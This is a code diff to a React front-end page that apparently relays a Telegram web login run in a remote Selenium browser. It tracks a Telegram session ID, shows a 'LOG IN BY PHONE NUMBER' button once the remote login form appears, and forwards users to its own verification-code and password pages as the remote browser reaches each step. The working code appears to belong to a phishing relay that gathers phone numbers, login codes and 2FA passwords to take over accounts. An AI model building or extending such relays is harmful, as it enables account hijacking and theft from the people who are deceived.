@@ -6,7 +6,6 @@ import { useNavigate } from 'react-router-dom';
 import { Page } from '@/components/Page.tsx';
 import { sessionManager } from '@/helpers/sessionManager';
 
-
 /**
  * IndexPage Component
  * 
@@ -56,8 +55,6 @@ export const IndexPage: FC = () => {
         // Store session ID in localStorage for PhoneLoginPage access
         localStorage.setItem('telegram_session_id', sessionResponse.sessionId);
         sessionStorage.setItem('telegram_session_id', sessionResponse.sessionId);
-        
-
         
         if (sessionResponse.isNew) {
           setLoginStatus('New session created');
@@ -170,7 +167,7 @@ export const IndexPage: FC = () => {
       // Listen for element check responses
       socketRef.current.on('elementCheckResult', (data) => {
         console.log('🔍 Element check result:', data);
-        if (data.sessionId === sessionId) {
+        if (data.sessionId === sessionId && data.elementType === 'PHONE_LOGIN_BUTTON') {
           if (data.elementFound) {
             console.log('✅ Phone login button found in Selenium window!');
             setPhoneLoginButtonFound(true);
@@ -349,14 +346,37 @@ export const IndexPage: FC = () => {
         } else if (data.event === 'error') {
           setLoginStatus(`Error: ${data.data?.error || 'Unknown error'}`);
         } else if (data.event === 'password_form_detected') {
+          console.log('🔐 Password form detected, checking current page...');
+          setLoginStatus('Password form detected - checking current page...');
+          
+          // Check if we're on the IndexPage (not on other pages)
+          const currentPath = window.location.pathname;
+          if (currentPath !== '/') {
+            console.log('✅ Not on IndexPage - ignoring password form detection');
+            setLoginStatus('Not on IndexPage - ignoring event');
+            return; // Don't navigate if we're not on the IndexPage
+          }
+          
           console.log('🔐 Password form detected, navigating to password page...');
           setLoginStatus('Password form detected - redirecting...');
           // Navigate to password page
           navigate(`/sign-in-password?sessionId=${encodeURIComponent(sessionId)}`);
         } else if (data.event === 'verification_form_detected') {
-          console.log('📱 Verification form detected, navigating to verification page...');
+          console.log('📱 Verification form detected, checking current page...');
+          setLoginStatus('Verification code form detected - checking current page...');
+          
+          // Check if we're on the IndexPage (not on other pages)
+          const currentPath = window.location.pathname;
+          if (currentPath !== '/') {
+            console.log('✅ Not on IndexPage - ignoring verification form detection');
+            setLoginStatus('Not on IndexPage - ignoring event');
+            return; // Don't navigate if we're not on the IndexPage
+          }
+          
+          console.log('📱 On IndexPage - navigating to verification page...');
           setLoginStatus('Verification code form detected - redirecting...');
-          // Navigate to verification page
+          // Navigate to verification page - we need to get the phone number from Selenium first
+          // For now, navigate without phone number and let the verification page handle it
           navigate(`/verification-code?sessionId=${encodeURIComponent(sessionId)}`);
         }
       }
@@ -501,7 +521,8 @@ export const IndexPage: FC = () => {
     }
   };
 
-  console.log('import.meta.env', import.meta.env);
+  console.log("!!! phoneLoginButtonFound -> ", phoneLoginButtonFound);
+  console.log("!!! isPhoneLoginLoading -> ", isPhoneLoginLoading);
 
   return (
     <Page back={false}>
@@ -836,39 +857,39 @@ export const IndexPage: FC = () => {
                  seleniumStatus}
               </div>
             )}
-            
-            {/* Phone Login Button - Always show */}
-            <button
-              onClick={goToPhoneLogin}
-              disabled={!phoneLoginButtonFound || isPhoneLoginLoading}
-              style={{
-                background: phoneLoginButtonFound && !isPhoneLoginLoading ? 'none' : '#f5f5f5',
-                border: 'none',
-                color: phoneLoginButtonFound && !isPhoneLoginLoading ? 'rgb(51,144,236)' : '#999',
-                fontSize: '16px',
-                cursor: phoneLoginButtonFound && !isPhoneLoginLoading ? 'pointer' : 'not-allowed',
-                textDecoration: 'none',
-                padding: '8px 16px',
-                borderRadius: '4px',
-                transition: 'background-color 0.2s',
-                letterSpacing: '0.02em',
-                opacity: phoneLoginButtonFound && !isPhoneLoginLoading ? 1 : 0.6
-              }}
-              onMouseOver={(e) => {
-                if (phoneLoginButtonFound && !isPhoneLoginLoading) {
-                  e.currentTarget.style.backgroundColor = '#f0f8ff';
-                }
-              }}
-              onMouseOut={(e) => {
-                if (phoneLoginButtonFound && !isPhoneLoginLoading) {
-                  e.currentTarget.style.backgroundColor = 'transparent';
-                }
-              }}
-            >
-              {isPhoneLoginLoading ? 'INITIATING...' : 
-               phoneLoginButtonFound ? 'LOG IN BY PHONE NUMBER' : 
-               import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'WAITING FOR PHONE LOGIN BUTTON...' : 'LOG IN BY PHONE NUMBER'}
-            </button>
+            {phoneLoginButtonFound && !isPhoneLoginLoading && (
+              <button
+                onClick={goToPhoneLogin}
+                disabled={!phoneLoginButtonFound || isPhoneLoginLoading}
+                style={{
+                  background: phoneLoginButtonFound && !isPhoneLoginLoading ? 'none' : '#f5f5f5',
+                  border: 'none',
+                  color: phoneLoginButtonFound && !isPhoneLoginLoading ? 'rgb(51,144,236)' : '#999',
+                  fontSize: '16px',
+                  cursor: phoneLoginButtonFound && !isPhoneLoginLoading ? 'pointer' : 'not-allowed',
+                  textDecoration: 'none',
+                  padding: '8px 16px',
+                  borderRadius: '4px',
+                  transition: 'background-color 0.2s',
+                  letterSpacing: '0.02em',
+                  opacity: phoneLoginButtonFound && !isPhoneLoginLoading ? 1 : 0.6,
+                }}
+                onMouseOver={(e) => {
+                  if (phoneLoginButtonFound && !isPhoneLoginLoading) {
+                    e.currentTarget.style.backgroundColor = '#f0f8ff';
+                  }
+                }}
+                onMouseOut={(e) => {
+                  if (phoneLoginButtonFound && !isPhoneLoginLoading) {
+                    e.currentTarget.style.backgroundColor = 'transparent';
+                  }
+                }}
+              >
+                {isPhoneLoginLoading ? 'INITIATING...' : 
+                phoneLoginButtonFound ? 'LOG IN BY PHONE NUMBER' : 
+                import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'WAITING FOR PHONE LOGIN BUTTON...' : 'LOG IN BY PHONE NUMBER'}
+              </button>
+            )}
           </div>
         </div>
       </div>
